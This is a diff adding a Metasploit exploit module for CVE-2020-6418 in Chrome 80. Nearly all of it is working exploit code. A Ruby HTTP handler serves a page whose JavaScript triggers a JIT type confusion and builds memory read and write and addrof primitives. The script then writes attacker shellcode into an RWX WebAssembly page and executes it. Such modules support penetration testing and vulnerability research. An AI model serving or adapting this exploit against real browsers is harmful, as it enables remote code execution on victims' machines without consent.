@@ -1,0 +1,382 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::Remote::HttpServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Google Chrome 80 JSCreate side-effect type confusion exploit',
+      'Description'    => %q{
+      This module exploits an issue in Google Chrome 80.0.3987.87 (64 bit). The exploit
+      corrupts the length of a float array (float_rel), which can then be used for out
+      of bounds read and write on adjacent memory.
+      The relative read and write is then used to modify a UInt64Array (uint64_aarw)
+      which is used for read and writing from absolute memory.
+      The exploit then uses WebAssembly in order to allocate a region of RWX memory,
+      which is then replaced with the payload shellcode.
+      The payload is executed within the sandboxed renderer process, so the browser
+      must be run with the --no-sandbox option for the payload to work correctly.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+          'Clément Lecigne', # discovery
+          'István Kurucsai', # exploit
+          'Vignesh S Rao',   # exploit
+          'timwr', # metasploit copypasta
+        ],
+      'References'     => [
+          ['CVE', '2020-6418'],
+          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=1053604'],
+          ['URL', 'https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping'],
+          ['URL', 'https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90'],
+        ],
+      'Arch'           => [ ARCH_X64 ],
+      'DefaultTarget'  => 0,
+      'Targets'        =>
+        [
+          ['Windows 10 - Google Chrome 80.0.3987.87 (64 bit)', {'Platform' => 'win'}],
+          ['macOS - Google Chrome 80.0.3987.87 (64 bit)', {'Platform' => 'osx'}],
+        ],
+      'DisclosureDate' => 'Feb 19 2020'))
+    register_advanced_options([
+      OptBool.new('DEBUG_EXPLOIT', [false, "Show debug information during exploitation", false]),
+    ])
+  end
+
+  def on_request_uri(cli, request)
+    if datastore['DEBUG_EXPLOIT'] && request.uri =~ %r{/print$*}
+      print_status("[*] #{request.body}")
+      send_response(cli, '')
+      return
+    end
+
+    print_status("Sending #{request.uri} to #{request['User-Agent']}")
+    escaped_payload = Rex::Text.to_unescape(payload.raw)
+    jscript = %Q^
+var shellcode = unescape("#{escaped_payload}");
+
+// HELPER FUNCTIONS
+let conversion_buffer = new ArrayBuffer(8);
+let float_view = new Float64Array(conversion_buffer);
+let int_view = new BigUint64Array(conversion_buffer);
+BigInt.prototype.hex = function() {
+    return '0x' + this.toString(16);
+};
+BigInt.prototype.i2f = function() {
+    int_view[0] = this;
+    return float_view[0];
+}
+BigInt.prototype.smi2f = function() {
+    int_view[0] = this << 32n;
+    return float_view[0];
+}
+Number.prototype.f2i = function() {
+    float_view[0] = this;
+    return int_view[0];
+}
+Number.prototype.f2smi = function() {
+    float_view[0] = this;
+    return int_view[0] >> 32n;
+}
+
+Number.prototype.fhw = function() {
+    float_view[0] = this;
+    return int_view[0] >> 32n;
+}
+
+Number.prototype.flw = function() {
+    float_view[0] = this;
+    return int_view[0] & BigInt(2**32-1);
+}
+
+Number.prototype.i2f = function() {
+    return BigInt(this).i2f();
+}
+Number.prototype.smi2f = function() {
+    return BigInt(this).smi2f();
+}
+
+function hex(a) {
+    return a.toString(16);
+}
+
+//
+// EXPLOIT
+//
+
+// the number of holes here determines the OOB write offset
+let vuln = [0.1, ,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1];
+var float_rel;      // float array, initially corruption target
+var float_carw;     // float array, used for reads/writes within the compressed heap
+var uint64_aarw;    // uint64 typed array, used for absolute reads/writes in the entire address space
+var obj_leaker;     // used to implement addrof
+vuln.pop();
+vuln.pop();
+vuln.pop();
+
+function empty() {}
+
+function f(nt) {
+    // The compare operation enforces an effect edge between JSCreate and Array.push, thus introducing the bug
+    vuln.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 156842065920.05);
+    for (var i = 0; i < 0x10000; ++i) {};
+}
+
+let p = new Proxy(Object, {
+    get: function() {
+        vuln[0] = {};
+        float_rel = [0.2, 1.2, 2.2, 3.2, 4.3];
+        float_carw = [6.6];
+        uint64_aarw = new BigUint64Array(4);
+        obj_leaker = {
+            a: float_rel,
+            b: float_rel,
+        };
+
+        return Object.prototype;
+    }
+});
+
+function main(o) {
+  for (var i = 0; i < 0x10000; ++i) {};
+  return f(o);
+}
+
+// reads 4 bytes from the compressed heap at the specified dword offset after float_rel
+function crel_read4(offset) {
+    var qw_offset = Math.floor(offset / 2);
+    if (offset & 1 == 1) {
+        return float_rel[qw_offset].fhw();
+    } else {
+        return float_rel[qw_offset].flw();
+    }
+}
+
+// writes the specified 4-byte BigInt value to the compressed heap at the specified offset after float_rel
+function crel_write4(offset, val) {
+    var qw_offset = Math.floor(offset / 2);
+    // we are writing an 8-byte double under the hood
+    // read out the other half and keep its value
+    if (offset & 1 == 1) {
+        temp = float_rel[qw_offset].flw();
+        new_val = (val << 32n | temp).i2f();
+        float_rel[qw_offset] = new_val;
+    } else {
+        temp = float_rel[qw_offset].fhw();
+        new_val = (temp << 32n | val).i2f();
+        float_rel[qw_offset] = new_val;
+    }
+}
+
+const float_carw_elements_offset = 0x14;
+
+function cabs_read4(caddr) {
+    elements_addr = caddr - 8n | 1n;
+    crel_write4(float_carw_elements_offset, elements_addr);
+    print('cabs_read4: ' + hex(float_carw[0].f2i()));
+    res = float_carw[0].flw();
+    // TODO restore elements ptr
+    return res;
+}
+
+
+// This function provides arbitrary within read the compressed heap
+function cabs_read8(caddr) {
+    elements_addr = caddr - 8n | 1n;
+    crel_write4(float_carw_elements_offset, elements_addr);
+    print('cabs_read8: ' + hex(float_carw[0].f2i()));
+    res = float_carw[0].f2i();
+    // TODO restore elements ptr
+    return res;
+}
+
+// This function provides arbitrary write within the compressed heap
+function cabs_write4(caddr, val) {
+    elements_addr = caddr - 8n | 1n;
+
+    temp = cabs_read4(caddr + 4n | 1n);
+    print('cabs_write4 temp: '+ hex(temp));
+
+    new_val = (temp << 32n | val).i2f();
+
+    crel_write4(float_carw_elements_offset, elements_addr);
+    print('cabs_write4 prev_val: '+ hex(float_carw[0].f2i()));
+
+    float_carw[0] = new_val;
+    // TODO restore elements ptr
+    return res;
+}
+
+const objleaker_offset = 0x41;
+function addrof(o) {
+    obj_leaker.b = o;
+    addr = crel_read4(objleaker_offset) & BigInt(2**32-2);
+    obj_leaker.b = {};
+    return addr;
+}
+
+const uint64_externalptr_offset = 0x1b;     // in 8-bytes
+
+// Arbitrary read. We corrupt the backing store of the `uint64_aarw` array and then read from the array
+function read8(addr) {
+    faddr = addr.i2f();
+    t1 = float_rel[uint64_externalptr_offset];
+    t2 = float_rel[uint64_externalptr_offset + 1];
+    float_rel[uint64_externalptr_offset] = faddr;
+    float_rel[uint64_externalptr_offset + 1] = 0.0;
+
+    val = uint64_aarw[0];
+
+    float_rel[uint64_externalptr_offset] = t1;
+    float_rel[uint64_externalptr_offset + 1] = t2;
+    return val;
+}
+
+// Arbitrary write. We corrupt the backing store of the `uint64_aarw` array and then write into the array
+function write8(addr, val) {
+    faddr = addr.i2f();
+    t1 = float_rel[uint64_externalptr_offset];
+    t2 = float_rel[uint64_externalptr_offset + 1];
+    float_rel[uint64_externalptr_offset] = faddr;
+    float_rel[uint64_externalptr_offset + 1] = 0.0;
+
+    uint64_aarw[0] = val;
+
+    float_rel[uint64_externalptr_offset] = t1;
+    float_rel[uint64_externalptr_offset + 1] = t2;
+    return val;
+}
+
+// Given an array of bigints, this will write all the elements to the address provided as argument
+function writeShellcode(addr, sc) {
+    faddr = addr.i2f();
+    t1 = float_rel[uint64_externalptr_offset];
+    t2 = float_rel[uint64_externalptr_offset + 1];
+    float_rel[uint64_externalptr_offset - 1] = 10;
+    float_rel[uint64_externalptr_offset] = faddr;
+    float_rel[uint64_externalptr_offset + 1] = 0.0;
+
+    for (var i = 0; i < sc.length; ++i) {
+        uint64_aarw[i] = sc[i]
+    }
+
+    float_rel[uint64_externalptr_offset] = t1;
+    float_rel[uint64_externalptr_offset + 1] = t2;
+}
+
+
+function get_compressed_rw() {
+
+    for (var i = 0; i < 0x10000; ++i) {empty();}
+
+    main(empty);
+    main(empty);
+
+    // Function would be jit compiled now.
+    main(p);
+
+    print(`Corrupted length of float_rel array = ${float_rel.length}`);
+}
+
+function get_arw() {
+    get_compressed_rw();
+    print('should be 0x2: ' + hex(crel_read4(0x15)));
+    let previous_elements = crel_read4(0x14);
+    //print(hex(previous_elements));
+    //print(hex(cabs_read4(previous_elements)));
+    //print(hex(cabs_read4(previous_elements + 4n)));
+    cabs_write4(previous_elements, 0x66554433n);
+    //print(hex(cabs_read4(previous_elements)));
+    //print(hex(cabs_read4(previous_elements + 4n)));
+
+    print('addrof(float_rel): ' + hex(addrof(float_rel)));
+    uint64_aarw[0] = 0x4142434445464748n;
+}
+
+function rce() {
+    function get_wasm_func() {
+        var importObject = {
+            imports: { imported_func: arg => print(arg) }
+        };
+        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
+        wasm_code = new Uint8Array(bc);
+        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
+        return wasm_mod.exports.exported_func;
+    }
+
+    let wasm_func = get_wasm_func();
+    //  traverse the JSFunction object chain to find the RWX WebAssembly code page
+    let wasm_func_addr = addrof(wasm_func);
+    let sfi = cabs_read4(wasm_func_addr + 12n) - 1n;
+    print('sfi: ' + hex(sfi));
+    let WasmExportedFunctionData = cabs_read4(sfi + 4n) - 1n;
+    print('WasmExportedFunctionData: ' + hex(WasmExportedFunctionData));
+
+    let instance = cabs_read4(WasmExportedFunctionData + 8n) - 1n;
+    print('instance: ' + hex(instance));
+
+    let wasm_rwx_addr = cabs_read8(instance + 0x68n);
+    print('wasm_rwx_addr: ' + hex(wasm_rwx_addr));
+
+    // write the shellcode to the RWX page
+    while(shellcode.length % 4 != 0){
+        shellcode += "\u9090";
+    }
+
+    let sc = [];
+
+    // convert the shellcode to BigInt
+    for (let i = 0; i < shellcode.length; i += 4) {
+        sc.push(BigInt(shellcode.charCodeAt(i)) + BigInt(shellcode.charCodeAt(i + 1) * 0x10000) + BigInt(shellcode.charCodeAt(i + 2) * 0x100000000) + BigInt(shellcode.charCodeAt(i + 3) * 0x1000000000000));
+    }
+
+    writeShellcode(wasm_rwx_addr,sc);
+
+    print('success');
+    wasm_func();
+}
+
+
+function exp() {
+    get_arw();
+    rce();
+}
+
+exp();
+^
+
+    if datastore['DEBUG_EXPLOIT']
+      debugjs = %Q^
+print = function(arg) {
+  var request = new XMLHttpRequest();
+  request.open("POST", "/print", false);
+  request.send("" + arg);
+};
+^
+      jscript = "#{debugjs}#{jscript}"
+    else
+      jscript.gsub!(/\/\/.*$/, '') # strip comments
+      jscript.gsub!(/^\s*print\s*\(.*?\);\s*$/, '') # strip print(*);
+    end
+
+    html = %Q^
+<html>
+<head>
+<script>
+#{jscript}
+</script>
+</head>
+<body>
+</body>
+</html>
+    ^
+    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
+  end
+
+end
